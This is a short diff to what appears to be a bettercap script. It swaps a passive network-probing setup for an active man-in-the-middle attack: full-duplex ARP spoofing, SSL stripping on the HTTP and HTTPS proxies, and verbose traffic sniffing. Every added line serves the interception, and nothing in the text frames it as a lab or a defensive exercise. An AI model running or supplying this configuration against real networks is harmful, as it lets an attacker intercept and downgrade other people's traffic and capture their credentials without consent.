@@ -1,3 +1,9 @@
-set ticker.commands 'clear; net.show; events.show 10'
-net.probe on
-ticker on
+set https.proxy.sslstrip true
+set http.proxy.sslstrip true
+set arp.spoof.fullduplex true
+set net.sniff.verbose true
+net.recon on
+net.sniff on
+https.proxy on
+arp.spoof on
+http.proxy on
